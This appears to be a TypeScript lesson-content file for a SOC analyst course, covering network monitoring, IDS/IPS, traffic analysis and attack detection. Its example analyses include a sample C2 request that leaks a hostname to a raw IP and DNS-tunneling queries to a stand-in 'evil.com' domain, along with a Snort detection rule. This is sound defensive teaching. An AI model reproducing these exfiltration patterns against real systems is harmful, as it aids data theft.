import { LessonContent } from "../../lessonContent";

export const module9: LessonContent[] = [

    // =========================================
  // MODULE 9: NETWORK SECURITY MONITORING
  // =========================================
  {
    id: "9.1",
    courseId: "soc-fundamentals",
    title: "Network Security Fundamentals",
    content: `
# Network Security Fundamentals

Understanding network basics is essential for SOC analysts who monitor and investigate network-based threats.

## The OSI Model for Security

\`\`\`
Layer 7 - Application   │ HTTP, DNS, SMTP         │ Web attacks, malware C2
Layer 6 - Presentation  │ SSL/TLS, encryption     │ Cert issues, downgrade attacks
Layer 5 - Session       │ Sessions, auth          │ Session hijacking
Layer 4 - Transport     │ TCP, UDP                │ Port scans, SYN floods
Layer 3 - Network       │ IP, ICMP, routing       │ IP spoofing, DDoS
Layer 2 - Data Link     │ MAC, switches           │ ARP poisoning, MAC spoofing
Layer 1 - Physical      │ Cables, signals         │ Physical access, tapping
\`\`\`

## Key Protocols for SOC Analysts

### TCP/IP Basics

\`\`\`
TCP THREE-WAY HANDSHAKE

Client                    Server
  │                         │
  │ ────── SYN ──────────→ │  "Can we connect?"
  │                         │
  │ ←───── SYN-ACK ─────── │  "Yes, let's connect"
  │                         │
  │ ────── ACK ──────────→ │  "Great, we're connected"
  │                         │
  │ ←───── DATA ──────────→│  (Communication)

SECURITY RELEVANCE:
• SYN flood = Many SYN, no ACK (DoS attack)
• Half-open connections = SYN scan (recon)
• Unusual flags = Evasion or crafted packets
\`\`\`

### Common Ports to Know

| Port | Protocol | Service | Security Relevance |
|------|----------|---------|-------------------|
| 21 | TCP | FTP | File exfiltration |
| 22 | TCP | SSH | Remote access |
| 23 | TCP | Telnet | Legacy, unencrypted |
| 25 | TCP | SMTP | Email, spam |
| 53 | UDP/TCP | DNS | C2, tunneling |
| 80 | TCP | HTTP | Web traffic |
| 443 | TCP | HTTPS | Encrypted web |
| 445 | TCP | SMB | Lateral movement |
| 3389 | TCP | RDP | Remote desktop |
| 8080 | TCP | HTTP Proxy | Alt web ports |

### DNS Fundamentals

\`\`\`
DNS QUERY FLOW

User types: www.example.com
     │
     ↓
┌─────────────────┐
│ Local Resolver  │ ← Check cache first
└────────┬────────┘
         │ (if not cached)
         ↓
┌─────────────────┐
│ Root DNS (.com) │
└────────┬────────┘
         ↓
┌─────────────────┐
│ TLD DNS         │ 
└────────┬────────┘
         ↓
┌─────────────────┐
│ Authoritative   │ ← Returns IP: 93.184.216.34
└─────────────────┘

SECURITY USES:
• Malware domains → C2 communication
• DNS tunneling → Data exfiltration
• DGA domains → Botnet communication
• DNS poisoning → Redirect to malicious sites
\`\`\`

## Network Security Devices

### Firewall

\`\`\`
FIREWALL FUNCTION

Internet ←→ [FIREWALL] ←→ Internal Network

Types:
├── Packet Filter: IP/port based rules
├── Stateful: Tracks connection state
├── Next-Gen (NGFW): Application awareness, IPS
└── WAF: Web application specific

What SOC Sees:
• Allowed/denied connections
• Source/destination IPs and ports
• Protocol violations
• Policy violations
\`\`\`

### IDS/IPS

\`\`\`
IDS vs IPS

IDS (Detection):
└── Monitors traffic passively
└── Generates alerts only
└── "Alarm system"

IPS (Prevention):
└── Sits inline with traffic
└── Can block malicious traffic
└── "Security guard"

Detection Methods:
├── Signature-based: Known attack patterns
├── Anomaly-based: Deviation from baseline
└── Behavioral: Suspicious behavior patterns
\`\`\`

### Proxy/Web Gateway

\`\`\`
PROXY VISIBILITY

User → [PROXY] → Internet

What SOC Sees:
├── Full URLs visited
├── User attribution
├── File downloads
├── Blocked categories
├── SSL inspection (if enabled)
└── Malware downloads
\`\`\`

## Network Segmentation

\`\`\`
NETWORK ZONES

┌─────────────────────────────────────────────────────────┐
│                     INTERNET                             │
└───────────────────────┬─────────────────────────────────┘
                        │
                 [Perimeter FW]
                        │
┌───────────────────────┴─────────────────────────────────┐
│                      DMZ                                 │
│   Web Servers   │   Mail Gateway   │   VPN Endpoint     │
└───────────────────────┬─────────────────────────────────┘
                        │
                 [Internal FW]
                        │
┌───────────────────────┴─────────────────────────────────┐
│                   INTERNAL NETWORK                       │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────┐  │
│  │ User VLAN   │  │ Server VLAN │  │ Management VLAN │  │
│  │ 10.0.1.0/24 │  │ 10.0.2.0/24 │  │  10.0.99.0/24   │  │
│  └─────────────┘  └─────────────┘  └─────────────────┘  │
└─────────────────────────────────────────────────────────┘

SECURITY PRINCIPLE:
Limit lateral movement between zones
\`\`\`

## Network Logging Sources

### Key Logs for SOC

| Source | Information Provided |
|--------|---------------------|
| Firewall | Connections allowed/denied, NAT |
| IDS/IPS | Threat detections, signatures matched |
| Proxy | URLs, user activity, downloads |
| DNS | Domain lookups, resolution |
| DHCP | IP assignments, MAC addresses |
| NetFlow | Traffic volume, connection metadata |
| VPN | Remote access sessions |
    `,
    keyTakeaways: [
      "The OSI model helps organize understanding of network attacks",
      "Know common ports and their security implications",
      "DNS is heavily abused for C2, tunneling, and malicious redirects",
      "Firewalls, IDS/IPS, and proxies provide key visibility points",
      "Network segmentation limits lateral movement during attacks"
    ],
    additionalResources: [
      { title: "TCP/IP Guide", type: "documentation", url: "http://www.tcpipguide.com" },
      { title: "Wireshark Documentation", type: "tool", url: "https://www.wireshark.org/docs/" }
    ]
  },
  {
    id: "9.2",
    courseId: "soc-fundamentals",
    title: "IDS/IPS Basics",
    content: `
# IDS/IPS Basics

Intrusion Detection and Prevention Systems are critical network security tools that SOC analysts interact with daily.

## Understanding IDS vs IPS

\`\`\`
IDS (Intrusion Detection System)
├── Passive monitoring
├── Alerts only, no blocking
├── Connected via SPAN/TAP
├── No impact on network latency
└── "Alarm system"

IPS (Intrusion Prevention System)
├── Active inline deployment
├── Can block/drop malicious traffic
├── Must handle traffic in real-time
├── Can impact latency if overloaded
└── "Security guard"
\`\`\`

## Detection Methods

### Signature-Based Detection

\`\`\`
HOW IT WORKS:
Known attack pattern → Rule created → Traffic matched → Alert

EXAMPLE SNORT RULE:
alert tcp $EXTERNAL_NET any -> $HOME_NET 445 
(msg:"ET EXPLOIT MS17-010 SMB Remote Code Execution"; 
 content:"|00 00 00|"; depth:3; 
 content:"|ff|SMB"; within:5;
 sid:2024217; rev:1;)

BREAKDOWN:
• alert tcp: Generate alert for TCP traffic
• $EXTERNAL_NET any: From any external IP/port
• $HOME_NET 445: To internal network, SMB port
• content: Specific bytes to match
• msg: Description of what was detected

STRENGTHS:
✓ Low false positives for known threats
✓ Fast matching
✓ Easy to understand

WEAKNESSES:
✗ Cannot detect unknown attacks
✗ Evasion via encoding/encryption
✗ Requires constant updates
\`\`\`

### Anomaly-Based Detection

\`\`\`
HOW IT WORKS:
Learn baseline → Monitor for deviation → Alert on anomalies

EXAMPLE BASELINE:
Normal DNS queries: 50-200/hour
Normal query length: 15-50 characters
Normal TTL requests: Standard values

ANOMALY DETECTED:
DNS queries: 5,000/hour          [!] Volume spike
Query length: 150+ characters    [!] DNS tunneling?
Unusual TXT record requests      [!] Data exfiltration?

STRENGTHS:
✓ Can detect unknown attacks
✓ Catches behavioral changes
✓ Good for insider threats

WEAKNESSES:
✗ Higher false positive rate
✗ Requires learning period
✗ Baseline can drift
\`\`\`

## Common IDS/IPS Solutions

| Solution | Type | Key Features |
|----------|------|--------------|
| Snort | Open Source | Signature-based, widely used |
| Suricata | Open Source | Multi-threaded, high performance |
| Zeek (Bro) | Open Source | Network analysis framework |
| Palo Alto | Commercial | NGFW with IPS capabilities |
| Cisco Firepower | Commercial | Enterprise IPS |

## Understanding IDS Alerts

### Alert Anatomy

\`\`\`
IDS ALERT EXAMPLE

Timestamp: 2024-01-15 14:32:45 UTC
Signature: ET MALWARE Win32/Emotet CnC Checkin
SID: 2024892
Priority: 1 (High)
Source: 10.0.1.108:49822
Destination: 185.234.218.45:443
Protocol: TCP

Raw Packet:
[Hex dump of matching traffic]

Classification: A Network Trojan was detected
\`\`\`

### Alert Priorities

\`\`\`
PRIORITY LEVELS

Priority 1: High Severity
├── Active exploitation attempts
├── Known malware communication
├── Critical vulnerabilities

Priority 2: Medium Severity
├── Suspicious activity
├── Policy violations
├── Potential threats

Priority 3: Low Severity
├── Informational alerts
├── Reconnaissance activity
├── Minor policy violations
\`\`\`

## Alert Triage Process

\`\`\`
IDS ALERT TRIAGE WORKFLOW

1. READ THE ALERT
   └─ What signature fired?
   └─ What classification?
   └─ Source and destination?

2. VALIDATE THE ALERT
   └─ Is the signature relevant?
   └─ Is the target vulnerable?
   └─ Is this expected behavior?

3. INVESTIGATE
   └─ Check source IP reputation
   └─ Review related traffic
   └─ Examine packet content

4. CORRELATE
   └─ Other alerts from same source?
   └─ EDR alerts on destination?
   └─ Similar activity elsewhere?

5. VERDICT
   └─ True Positive → Respond
   └─ False Positive → Document/Tune
   └─ Needs more info → Investigate further
\`\`\`

## Common False Positive Scenarios

\`\`\`
FREQUENT FALSE POSITIVES

1. Vulnerability Scanners
   └─ Internal security tools triggering exploit signatures
   └─ Solution: Whitelist scanner IPs

2. Penetration Testing
   └─ Authorized testing looks like attacks
   └─ Solution: Scheduled testing windows, whitelist

3. Legitimate Software
   └─ Some apps use techniques that look suspicious
   └─ Solution: Application baseline, exceptions

4. Encrypted Traffic
   └─ Partial signature matches in encrypted data
   └─ Solution: Context-aware tuning

5. Generic Signatures
   └─ Overly broad detection patterns
   └─ Solution: Threshold adjustments, refinement
\`\`\`

## Tuning Best Practices

\`\`\`
TUNING APPROACH

DON'T: Disable rules that cause false positives
DO: Tune with specific exceptions

Example:
Before: Rule fires on all traffic to port 445
After: Rule excludes traffic from file servers to expected destinations

DOCUMENTATION:
• Why was tuning needed?
• What was the false positive?
• What exception was created?
• Who approved the change?
\`\`\`
    `,
    keyTakeaways: [
      "IDS monitors and alerts; IPS can actively block threats",
      "Signature-based detection is fast but only catches known threats",
      "Anomaly-based detection can find unknown attacks but has more false positives",
      "Alert triage requires validating relevance and investigating context",
      "Tuning should create specific exceptions, not disable rules entirely"
    ],
    practicalExercise: {
      title: "IDS Alert Analysis",
      description: "Analyze IDS alerts and determine if they are true or false positives.",
      steps: [
        "Review 5 sample IDS alerts",
        "Research each signature to understand what it detects",
        "Analyze source/destination context for each alert",
        "Classify each as true positive, false positive, or needs investigation",
        "Suggest tuning for false positive scenarios"
      ]
    }
  },
  {
    id: "9.3",
    courseId: "soc-fundamentals",
    title: "Network Traffic Analysis",
    content: `
# Network Traffic Analysis

Network traffic analysis involves examining network data to detect and investigate security threats. This skill is essential for SOC analysts.

## Types of Network Data

### 1. Packet Captures (PCAP)

\`\`\`
PCAP = Full packet capture

Contains:
├── Complete packet headers
├── Full payload data
├── Timing information
└── All protocol details

Use Cases:
├── Deep packet inspection
├── Malware analysis
├── Forensic investigation
└── Protocol analysis

Challenges:
├── Large storage requirements
├── Privacy concerns (full content)
├── Performance impact
└── Encryption limits visibility
\`\`\`

### 2. NetFlow/IPFIX

\`\`\`
NETFLOW = Connection metadata

Contains:
├── Source/Destination IP
├── Source/Destination Port
├── Protocol
├── Byte/Packet counts
├── Timestamps
└── Flags

Does NOT Contain:
├── Payload data
├── Application content
└── File transfers

Use Cases:
├── Traffic volume analysis
├── Baseline establishment
├── Anomaly detection
├── Connection tracking
\`\`\`

### 3. DNS Logs

\`\`\`
DNS LOGS

Query:  timestamp | client_ip | query_name | query_type
Response: timestamp | query_name | response_ip | TTL

Security Analysis:
├── Known malicious domains
├── DGA pattern detection
├── DNS tunneling
├── Fast flux networks
└── Typosquatting
\`\`\`

## Traffic Analysis Techniques

### Baseline Comparison

\`\`\`
ESTABLISHING BASELINES

Step 1: Collect normal traffic patterns
- Time of day variations
- Day of week patterns
- Seasonal variations

Step 2: Define thresholds
- Volume: Normal 10GB/day, Alert at 15GB+
- Connections: Normal 5,000/hour, Alert at 10,000+
- Countries: Normal US/EU, Alert on unexpected geolocations

Step 3: Alert on deviations
- Volume spikes: Possible exfiltration
- Connection spikes: Possible DDoS or scanning
- New destinations: Possible C2
\`\`\`

### Beaconing Detection

\`\`\`
BEACONING PATTERN

Malware often "phones home" at regular intervals:

Timeline visualization:
|----|----|----|----|----|----|----|----|  (Regular intervals)
 15m  15m  15m  15m  15m  15m  15m  15m

Detection Indicators:
├── Regular time intervals (with slight jitter)
├── Similar packet sizes
├── Persistent over long periods
├── Often to unusual destinations
└── May be encrypted (HTTPS)

Analysis Query (conceptual):
GROUP connections BY destination
CALCULATE interval_stddev
WHERE interval_stddev < threshold
AND connection_count > minimum
→ Potential beaconing behavior
\`\`\`

### Data Exfiltration Indicators

\`\`\`
EXFILTRATION RED FLAGS

Volume Anomalies:
├── Large uploads to unknown destinations
├── Unusual outbound traffic spikes
├── After-hours data transfers
└── Compressed/encrypted file transfers

Protocol Anomalies:
├── DNS with large TXT responses
├── ICMP with unexpected payload sizes
├── HTTP POST with large bodies
└── Unusual protocol on standard ports

Destination Anomalies:
├── Personal cloud storage
├── New external IPs
├── Tor exit nodes
└── VPN/proxy services
\`\`\`

## Practical Analysis Examples

### Example 1: Suspicious HTTP Traffic

\`\`\`
SCENARIO:
Host 10.0.1.108 making HTTP requests to 185.234.218.45

ANALYSIS:

GET /gate.php?data=aG9zdG5hbWU9V09SS1NUQVRJT04tMDg= HTTP/1.1
Host: 185.234.218.45
User-Agent: Mozilla/5.0

OBSERVATIONS:
1. Direct IP access (no domain) → Suspicious
2. "gate.php" → Common malware endpoint name
3. Base64 data in URL → Data exfiltration
4. Regular interval requests → Beaconing

DECODE BASE64:
aG9zdG5hbWU9V09SS1NUQVRJT04tMDg= 
→ hostname=WORKSTATION-08

VERDICT: Likely malware C2 communication
\`\`\`

### Example 2: DNS Tunneling

\`\`\`
SCENARIO:
High volume of DNS queries to *.tunnel.evil.com

SAMPLE QUERIES:
aGVsbG8gd29ybGQ.tunnel.evil.com
dGhpcyBpcyBhIHRlc3Q.tunnel.evil.com
ZXhmaWx0cmF0ZWQgZGF0YQ.tunnel.evil.com

OBSERVATIONS:
1. Subdomain looks like Base64 → Data encoding
2. High query volume → More than normal DNS
3. All to same parent domain → C2 infrastructure
4. Query length > 50 chars → Unusual for normal DNS

DECODE SUBDOMAINS:
aGVsbG8gd29ybGQ → "hello world"
dGhpcyBpcyBhIHRlc3Q → "this is a test"
ZXhmaWx0cmF0ZWQgZGF0YQ → "exfiltrated data"

VERDICT: DNS tunneling for data exfiltration
\`\`\`

### Example 3: Port Scanning

\`\`\`
SCENARIO:
Single source connecting to many destinations on same port

NETFLOW DATA:
10.0.1.50 → 10.0.1.1:22   1 packet
10.0.1.50 → 10.0.1.2:22   1 packet
10.0.1.50 → 10.0.1.3:22   1 packet
... (continues for entire subnet)

OBSERVATIONS:
1. Sequential IP targets
2. Same port (22 = SSH)
3. Single packet per host → SYN scan
4. Very short duration

VERDICT: Internal port scan, likely reconnaissance
\`\`\`

## Network Analysis Checklist

\`\`\`
□ What's the communication pattern (volume, timing)?
□ Is the destination IP/domain known good, bad, or unknown?
□ What protocol is being used? Is it normal for that port?
□ What's in the payload (if available)?
□ Does this match known C2 patterns?
□ Is there beaconing behavior?
□ Are there related alerts from other sources?
\`\`\`
    `,
    keyTakeaways: [
      "Network data includes PCAPs (full content), NetFlow (metadata), and logs",
      "Baseline comparison helps identify anomalous traffic patterns",
      "Beaconing shows regular-interval callbacks typical of malware C2",
      "DNS tunneling uses encoded data in subdomain names",
      "Port scanning shows single source probing many targets"
    ],
    practicalExercise: {
      title: "Network Traffic Investigation",
      description: "Analyze network traffic samples to identify malicious activity.",
      steps: [
        "Review the provided NetFlow data summary",
        "Identify any beaconing patterns",
        "Analyze the DNS query log for anomalies",
        "Examine the HTTP requests for suspicious indicators",
        "Document your findings and conclusions"
      ]
    }
  },
  {
    id: "9.4",
    courseId: "soc-fundamentals",
    title: "Common Network Attacks",
    content: `
# Common Network Attacks

Understanding how attackers operate on networks helps SOC analysts recognize and respond to threats effectively.

## Reconnaissance Attacks

### Port Scanning

\`\`\`
SCAN TYPES

SYN Scan (Half-Open):
├── Send SYN packet
├── Open port: SYN-ACK response
├── Closed port: RST response
├── Stealthy, doesn't complete connection
└── Detection: Many SYN packets, few ACKs

Connect Scan:
├── Completes full TCP handshake
├── More detectable (logged connections)
└── Detection: Short-lived connections to many ports

UDP Scan:
├── Send UDP packet
├── Open: Response or no response
├── Closed: ICMP port unreachable
└── Detection: ICMP unreachable messages

DETECTION EXAMPLE:
Source 10.0.1.50 connected to:
- 10.0.2.1 ports: 22,80,443,445,3389
- 10.0.2.2 ports: 22,80,443,445,3389
- 10.0.2.3 ports: 22,80,443,445,3389

Pattern: Same source, multiple targets, multiple ports
\`\`\`

### Network Mapping

\`\`\`
NETWORK DISCOVERY TECHNIQUES

ICMP Sweep:
└── Ping all IPs in range
└── Map which hosts are alive

ARP Discovery:
└── ARP who-has for IP range
└── Works on local network

Service Fingerprinting:
└── Identify services and versions
└── Helps find vulnerable systems
\`\`\`

## Command and Control (C2)

### C2 Communication Patterns

\`\`\`
COMMON C2 METHODS

HTTP/HTTPS Beaconing:
├── Regular interval callbacks
├── GET requests with encoded data
├── POST for commands/exfiltration
├── Often mimics legitimate traffic

DNS C2:
├── Commands encoded in DNS queries
├── Responses in TXT/CNAME records
├── Evades web proxies
└── Low bandwidth but stealthy

Domain Generation Algorithms (DGA):
├── Malware generates random domain names
├── C2 registers some of them
├── Hard to block all possibilities
└── Detection: High NXDomain responses, entropy analysis
\`\`\`

### C2 Detection Indicators

\`\`\`
RED FLAGS FOR C2

Beaconing Behavior:
☑ Regular interval connections (15min, 30min, etc.)
☑ Consistent packet sizes
☑ Persistent over hours/days
☑ To same destination

Traffic Anomalies:
☑ Encrypted traffic to unusual destinations
☑ Non-standard ports for protocols
☑ Mismatched application headers
☑ Large volumes of DNS TXT queries

Destination Indicators:
☑ Recently registered domains
☑ DGA-looking domain names
☑ Bulletproof hosting providers
☑ Tor exit nodes
\`\`\`

## Lateral Movement

### SMB-Based Movement

\`\`\`
SMB ATTACK TECHNIQUES

PsExec/Remote Execution:
├── Creates service on remote host
├── Executes payload
├── Uses SMB port 445
└── Detection: Event ID 7045, remote service creation

Pass-the-Hash:
├── Stolen NTLM hash used for auth
├── No password needed
├── Works with SMB, WMI, etc.
└── Detection: Unusual auth patterns, Event ID 4624 Type 3

SMB Shares:
├── Map administrative shares (C$, ADMIN$)
├── Copy tools/malware
├── Execute remotely
└── Detection: Unusual share access, file copies
\`\`\`

### WMI and PowerShell Remoting

\`\`\`
REMOTE EXECUTION METHODS

WMI (Windows Management Instrumentation):
├── Creates process on remote host
├── Port 135 (RPC) + dynamic ports
├── Detection: WmiPrvSE.exe spawning processes

PowerShell Remoting:
├── Port 5985 (HTTP) or 5986 (HTTPS)
├── Full PowerShell capabilities remotely
├── Detection: wsmprovhost.exe, Event ID 4103/4104

RDP (Remote Desktop):
├── Port 3389
├── Interactive session
├── Detection: Event ID 4624 Type 10
\`\`\`

## Data Exfiltration

### Exfiltration Techniques

\`\`\`
EXFILTRATION METHODS

Direct Upload:
├── FTP, SFTP, SCP
├── Cloud storage (Dropbox, GDrive)
├── File sharing services
└── Detection: Large outbound transfers

Protocol Tunneling:
├── DNS tunneling (data in queries)
├── ICMP tunneling (data in ping)
├── HTTP tunneling (data in requests)
└── Detection: Protocol anomalies

Covert Channels:
├── Steganography (data in images)
├── Encrypted containers
├── Custom protocols on standard ports
└── Detection: Baseline deviation
\`\`\`

### Detection Strategies

\`\`\`
EXFILTRATION DETECTION

Volume-Based:
├── Large outbound data volumes
├── Unusual upload/download ratios
├── After-hours transfers
└── Compressed file uploads

Destination-Based:
├── Personal cloud storage
├── Unknown external hosts
├── Newly registered domains
├── Known file sharing sites

Content-Based (DLP):
├── Sensitive data patterns
├── Document classifications
├── PII/PHI detection
└── Source code markers
\`\`\`

## Attack Detection Summary

\`\`\`
NETWORK ATTACK INDICATORS CHEAT SHEET

Reconnaissance:
• Port scans: Single source, many targets/ports
• Host discovery: ICMP sweep, ARP requests

C2 Communication:
• Beaconing: Regular intervals, same destination
• DNS C2: Long queries, TXT records, high NXDomain
• DGA: Random-looking domains, high entropy

Lateral Movement:
• SMB: Port 445, unusual access to shares
• WMI: Port 135, WmiPrvSE spawning processes
• RDP: Port 3389, unusual login patterns

Exfiltration:
• Volume: Large outbound transfers
• Protocols: DNS tunneling, ICMP anomalies
• Destinations: Cloud storage, unknown hosts
\`\`\`
    `,
    keyTakeaways: [
      "Port scanning shows single source connecting to many targets/ports",
      "C2 traffic often exhibits beaconing patterns with regular intervals",
      "Lateral movement uses SMB, WMI, PowerShell Remoting, and RDP",
      "Exfiltration can use direct uploads, protocol tunneling, or covert channels",
      "Baseline knowledge is essential for detecting anomalous activity"
    ],
    practicalExercise: {
      title: "Attack Pattern Recognition",
      description: "Identify attack patterns in sample network data.",
      steps: [
        "Review the network traffic samples provided",
        "Identify any reconnaissance activity",
        "Look for C2 communication patterns",
        "Find evidence of lateral movement",
        "Detect any data exfiltration indicators"
      ]
    }
  },
  {
    id: "9.5",
    courseId: "soc-fundamentals",
    title: "Network Security Quiz",
    content: `
# Network Security Quiz

Test your knowledge of network security monitoring, IDS/IPS, and traffic analysis.

## Quiz Overview

This quiz covers the network security concepts from Module 9:
- Network security fundamentals
- IDS/IPS technologies
- Traffic analysis techniques
- Network protocols and ports
- Security architectures

## Instructions

1. **Duration**: 25 minutes
2. **Questions**: 5 multiple-choice questions
3. **Passing Score**: 70% (4 out of 5 questions)
4. **Attempts**: Unlimited - retake if needed

## Key Topics to Review

Before taking the quiz, make sure you understand:
- Network security principles
- IDS vs IPS differences
- Common network protocols
- Port numbers and services
- Network segmentation
- Firewall technologies

## Taking the Quiz

Click the "Start Quiz" button below when you're ready. The quiz will cover:
- Network security concepts
- IDS/IPS operations
- Protocol analysis
- Port identification
- Security architectures

Good luck! Network security knowledge is essential for comprehensive defense.
    `,
    keyTakeaways: [
      "Network security provides the first line of defense against cyber threats",
      "IDS detects suspicious activity while IPS can actively block threats",
      "Understanding network protocols enables effective traffic analysis",
      "Proper port management reduces attack surface and improves security",
      "Network segmentation limits lateral movement and contains breaches"
    ],
    practicalExercise: {
      title: "Quiz Preparation",
      description: "Review network security concepts before taking the quiz.",
      steps: [
        "Study network security fundamentals",
        "Learn IDS/IPS differences and capabilities",
        "Review common protocols and ports",
        "Understand network segmentation",
        "Take the quiz when ready"
      ]
    }
  }
];
